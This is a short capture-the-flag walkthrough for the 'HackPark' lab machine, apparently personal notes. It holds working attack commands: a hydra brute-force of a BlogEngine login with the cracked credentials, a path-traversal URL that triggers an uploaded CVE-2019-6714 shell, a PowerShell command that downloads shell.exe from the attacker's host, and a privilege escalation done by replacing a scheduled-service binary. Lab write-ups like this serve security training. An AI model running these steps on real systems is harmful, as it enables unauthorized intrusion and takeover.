# HACKPARK
```
IP = 10.10.58.73
```
+ Ran initial nmap scan
+ Found robots.txt 
```
User-agent: *
Disallow: /Account/*.*
Disallow: /search
Disallow: /search.aspx
Disallow: /error404.aspx
Disallow: /archive
Disallow: /archive.aspx

#Remove the '#' character below and replace example.com with your own website address.
#sitemap: http://example.com/sitemap.axd 
# WebMatrix 1.0
```
+ Found a login page using gobuster (which yielded a lot of paths to explore)
+ Used hydra to crack password with `hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.58.73 http-post-form "/Account/login.aspx?ReturnURL=/admin:__VIEWSTATE=c5xm%2Fgj5uTo07SXbmxE7%2BtOAfu5CenBuTtuD9rtbDvcWhud5qADWr3%2FSv0g829tkopysMjkBw6Bnajzaz%2FJeR2FhHM6I731xImi%2FKGce03HuTvnkec4YEEBJhT8Y2SuZpViMoTT8DreSbGvwlA3rAsJmFjvMk2pROd9hIZ%2BM%2Frf%2Fh%2FIY&__EVENTVALIDATION=4ysBBEl4MNdkfrX0gOwq0CRFeaHhGpyAljIFmB9DaA3gfFqVrJNzGslOIIBYicS1L%2BixJB1iRZOCmfKhPS%2F0jz2qw01K3JP95hMFWzsE065NMF8QIzRRAk8avvGDMacv1WT8svVl3RXdQ6SZdkhMg81%2Bx7JaqDlZ0l8c1noEJ8xqQiCZ&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login Failed" -vv`
+ Successfully cracked password [admin:1qaz2wsx]
+ Logged into blogengine.net and found its version [3.3.6.0]
+ Found exploit with CVE-2019-6714, tweaked it and uploaded in the Content section of blogengine as PostView.ascx
+ Visited `http://10.10.58.73/?theme=../../App_Data/files/` to get a shell on 9001 listener
+ Served opt/windows folder using python SimpleHTTPServer
+ Uploaded payload to catch in meterpreter using `powershell -c "Invoke-WebRequest -Uri 'http://10.11.4.238:9002/shell.exe' -OutFile 'C:\Windows\Temp\shell.exe'"`
+ Now for privesc, look at suspicious services and found WindowsScheduler, then went to location found a binary running every 30 secs on elevated privs
+ Replaced binary `Message.exe` with `shell.exe` and exited the meterpreter. Relaunched meterpreter and waited to gain admin shell.